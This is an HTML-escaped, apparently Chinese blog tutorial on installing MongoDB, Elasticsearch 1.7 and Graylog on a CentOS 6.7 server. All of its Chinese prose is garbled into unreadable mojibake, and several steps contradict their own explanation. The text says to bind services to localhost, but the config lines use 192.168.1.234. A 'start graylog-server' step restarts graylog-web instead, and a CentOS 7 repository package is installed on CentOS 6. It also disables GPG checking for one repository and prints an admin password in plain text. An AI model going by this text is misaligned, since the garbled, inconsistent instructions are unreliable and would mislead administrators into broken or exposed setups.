&lt;h3 id=&quot;ç³»ç»Ÿè¦æ±‚ï¼š&quot;&gt;&lt;a href=&quot;#ç³»ç»Ÿè¦æ±‚ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç³»ç»Ÿè¦æ±‚ï¼š&quot;&gt;&lt;/a&gt;ç³»ç»Ÿè¦æ±‚ï¼š&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CentOS 6.7&lt;/li&gt;
&lt;li&gt;å†…å­˜è‡³å°‘2GB&lt;/li&gt;
&lt;li&gt;æœ‰rootæƒé™&lt;/li&gt;
&lt;li&gt;æœåŠ¡å™¨ipæ˜¯192.168.1.234ï¼Œå·²å®‰è£… 1.8.0_77-b03&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™é‡Œæˆ‘åªæ˜¯ä¸¾ä¾‹å•ä¸€æ¨¡å¼è·‘æœåŠ¡ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å®‰è£…MongoDB&quot;&gt;&lt;a href=&quot;#å®‰è£…MongoDB&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…MongoDB&quot;&gt;&lt;/a&gt;å®‰è£…MongoDB&lt;/h3&gt;&lt;p&gt;MongoDBçš„å®‰è£…éå¸¸ç®€å•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯¼å…¥MongoDB GPGå¯†é’¥åˆ°rpmï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vim /etc/yum.repos.d/mongodb-org-3.0.repo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mongodb-org&lt;span class=&quot;bullet&quot;&gt;-3.0&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=MongoDB Repository&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;baseurl=http://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/&lt;span class=&quot;number&quot;&gt;3.0&lt;/span&gt;/x86_64/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;gpgcheck=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enabled=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# yum install -y mongodb-org&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vi /etc/yum.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æœ€åä¸€è¡Œæ·»åŠ ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# service mongod start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# chkconfig mongod on&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vi /etc/security/limits.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æœ€åä¸€è¡Œæ·»åŠ ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                soft    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                hard    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mongod           soft    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                soft    nofile          &lt;span class=&quot;number&quot;&gt;131072&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                hard    nofile          &lt;span class=&quot;number&quot;&gt;131072&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/init.d/mongod&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ulimit -f unlimited è¡Œå‰æ’å…¥ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if test -f /sys/kernel/mm/transparent_hugepage/enabled; then&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/enabled&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  fi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if test -f /sys/kernel/mm/transparent_hugepage/defrag; then&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/defrag&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  fi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/mongod restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;å®‰è£…Elasticsearch&quot;&gt;&lt;a href=&quot;#å®‰è£…Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…Elasticsearch&quot;&gt;&lt;/a&gt;å®‰è£…Elasticsearch&lt;/h3&gt;&lt;p&gt;Graylogç›®å‰ä¸ºæ­¢åªèƒ½ä½¿ç”¨Elasticsearch 2.0ä»¥å‰çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ï¼Œåœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæˆ‘å°†å®‰è£…Elasticsearch 1.7.xã€‚&lt;/p&gt;
&lt;p&gt;æ·»åŠ Elasticsearch GPGå¯†é’¥ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo rpm --import http://packages.elastic.co/GPG-KEY-elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åˆ›å»ºElasticsearchæºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/yum.repos.d/elasticsearch.repo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;section&quot;&gt;[elasticsearch-1.7]&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=Elasticsearch repository for &lt;span class=&quot;number&quot;&gt;1.7&lt;/span&gt;.x packages&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;baseurl&lt;/span&gt;=http://packages.elastic.co/elasticsearch/&lt;span class=&quot;number&quot;&gt;1.7&lt;/span&gt;/centos&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;gpgcheck&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;gpgkey&lt;/span&gt;=http://packages.elastic.co/GPG-KEY-elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;enabled&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å®‰è£…Elasticsearchï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo yum -y install elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /data/es-data -p
mkdir /data/es-work -p
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Elasticsearchå®‰è£…å®Œæˆä¹‹åï¼Œç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/elasticsearch/elasticsearch.yml

 node.data: true  # æ•°æ®å­˜æ”¾true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰¾åˆ°cluster.nameä¸€è¡Œï¼Œå–æ¶ˆè¿™ä¸€è¡Œçš„æ³¨é‡Šï¼Œå¹¶æŠŠå€¼æ”¹ä¸ºgraylog-developmentï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cluster.name: graylog-development


 path.data: /data/es-data     esæ•°æ®å­˜æ”¾ç›®å½•  è¿™é‡Œéœ€è¦è‡ªå·±æ–°å»ºç›®å½•

 path.work: /data/es-work   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä½ ä¹Ÿè®¸æƒ³è¦é™åˆ¶å¤–éƒ¨è®¿é—®Elasticsearchï¼ˆç«¯å£9200ï¼‰ï¼Œè¿™æ ·å¯ä»¥æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚æ‰¾åˆ°network.hostä¸€è¡Œï¼Œå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æŠŠå€¼æ”¹ä¸ºlocalhostï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;network.host: 192.168.1.234
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿å­˜é€€å‡ºæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;é‡å¯Elasticsearchï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ service elasticsearch start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è®¾ç½®å¼€æœºå¯åŠ¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ chkconfig --add elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æµ‹è¯•Elasticsearchæ˜¯å¦æ­£å¸¸è¿è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -XGET &amp;apos;http://localhost:9200/_cluster/health?pretty=true&amp;apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¾“å‡ºçš„ä¿¡æ¯å¦‚ä¸‹è¡¨ç¤ºElasticsearchå®‰è£…æˆåŠŸï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight autoit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;drwxr-xr-x. &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; root   root  &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;æœˆ  &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2011&lt;/span&gt; src&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root&lt;span class=&quot;symbol&quot;&gt;@ELK&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;meta&quot;&gt;#  curl -XGET &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.234:9200/_cluster/health?pretty=true&#39;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;graylog-development&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;status&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;yellow&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;timed_out&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_nodes&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_data_nodes&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_primary_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;relocating_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;initializing_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;unassigned_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;delayed_unassigned_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_pending_tasks&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_in_flight_fetch&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å®‰è£…Graylag&lt;/p&gt;
&lt;p&gt;Graylogçš„æœ€æ–°ç‰ˆæ˜¯1.1.4ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼š&lt;br&gt;&lt;a href=&quot;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpm&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨Graylogçš„æ‰€æœ‰ä¾èµ–è½¯ä»¶å®‰è£…å®Œæˆï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬æ¥å®‰è£…graylog-serverã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼Œä¸‹è½½Graylog RPMè½¯ä»¶åŒ…ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cd 
$ sudo rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-1.3-repository-el7_latest.rpm
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å®‰è£…graylog-serverï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install graylog-server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å®‰è£…pwgenï¼Œæˆ‘ä»¬ä½¿ç”¨å®ƒç”Ÿæˆéšæœºå¯†ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install epel-release
yum -y install pwgen
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç°åœ¨æˆ‘ä»¬æ¥è®¾ç½®Graylogç®¡ç†å‘˜çš„å¯†é’¥ã€‚é…ç½®æ–‡ä»¶ä½äº/etc/graylog/server/server.confç›®å½•ï¼Œéœ€è¦ä¿®æ”¹password_secretå‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ SECRET=$(pwgen -s 96 1)
$ sudo -E sed -i -e &amp;apos;s/password_secret =.*/password_secret = &amp;apos;$SECRET&amp;apos;/&amp;apos; /etc/graylog/server/server.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰§è¡Œå®Œä¸Šé¢å‘½ä»¤ä¹‹åï¼Œpassword_secretå‚æ•°çš„æ ·å­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸€æ­¥ï¼Œè®¾ç½®ç®¡ç†å‘˜å¯†ç ã€‚ç”±äºå¯†ç ä½¿ç”¨shaå“ˆå¸Œç®—æ³•ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ˜æ–‡å¯†ç è½¬æ¢ä¸ºhashï¼Œç„¶åèµ‹å€¼ç»™root_password_sha2å‚æ•°ã€‚ä¾‹å¦‚ï¼Œæˆ‘è¦è®¾ç½®çš„ç®¡ç†å‘˜å¯†ç æ˜¯ Ihaozhuo_b313ï¼Œå®ƒå¯¹åº”çš„hashä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ echo -n Ihaozhuo_b313 | sha256sum | awk &amp;apos;{print $1}&amp;apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘/etc/graylog/server/server.confï¼Œè®¾ç½®root_password_sha2å‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/graylog/server/server.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨Graylogç®¡ç†å‘˜å¯†ç ä¸ºIhaozhuo_b313ã€‚&lt;/p&gt;
&lt;p&gt;é…ç½®rest_transport_uriå‚æ•°ï¼Œè®¾ç½®Graylog webæ¥å£å’ŒæœåŠ¡å™¨çš„æ²Ÿé€šæ–¹å¼ã€‚ç”±äºæˆ‘ä»¬æŠŠæ‰€æœ‰ç»„ä»¶éƒ½å®‰è£…åˆ°äº†å•ç‹¬çš„ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œéœ€è¦æŠŠå€¼è®¾ç½®ä¸º&lt;strong&gt;127.0.0.1&lt;/strong&gt; æˆ– &lt;strong&gt;localhost&lt;/strong&gt;ã€‚æ‰¾åˆ°rest_transport_uriä¸€è¡Œï¼Œå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æŠŠå€¼è®¾ç½®ä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rest_transport_uri = http://192.168.1.234:12900/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç”±äºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªElasticsearch shardï¼Œéœ€è¦æŠŠelasticsearch_shardså‚æ•°è®¾ç½®ä¸º1ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;elasticsearch_shards = 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ›´æ”¹elasticsearch_cluster_nameå‚æ•°ï¼Œåº”è¯¥å’Œå‰é¢Elasticsearchçš„&lt;strong&gt;cluster.name&lt;/strong&gt;å‚æ•°ç›¸å¯¹åº”ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;elasticsearch_cluster_name = graylog-development
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å–æ¶ˆä¸‹é¢ä¸¤è¡Œçš„æ³¨é‡Šï¼Œæ£€æµ‹Elasticsearchï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;172 elasticsearch_discovery_zen_ping_multicast_enabled = false
173 elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯åŠ¨graylog-serverï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/graylog-web restart
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;å®‰è£…Graylog-Web&quot;&gt;&lt;a href=&quot;#å®‰è£…Graylog-Web&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…Graylog Web&quot;&gt;&lt;/a&gt;å®‰è£…Graylog Web&lt;/h3&gt;&lt;p&gt;å®‰è£…Graylog Webï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo yum -y install graylog-web
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å®‰è£…å®Œæˆä¹‹åé…ç½®Graylog Webçš„å¯†é’¥ï¼Œé…ç½®æ–‡ä»¶ä½äº/etc/graylog/web/web.confï¼Œæ›´æ”¹application.secretå‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ SECRET=$(pwgen -s 96 1)
$ sudo -E sed -i -e &amp;apos;s/application\.secret=&amp;quot;&amp;quot;/application\.secret=&amp;quot;&amp;apos;$SECRET&amp;apos;&amp;quot;/&amp;apos; /etc/graylog/web/web.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é…ç½®graylog2-server.uriså‚æ•°ï¼Œå®ƒçš„å€¼åº”è¯¥å’ŒGraylogçš„rest_listen_uriå‚æ•°ç›¸å¯¹åº”ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/graylog/web/web.conf

graylog2-server.uris=&amp;quot;http://127.0.0.1:12900/&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é‡å¯graylog-webï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/graylog-web restart
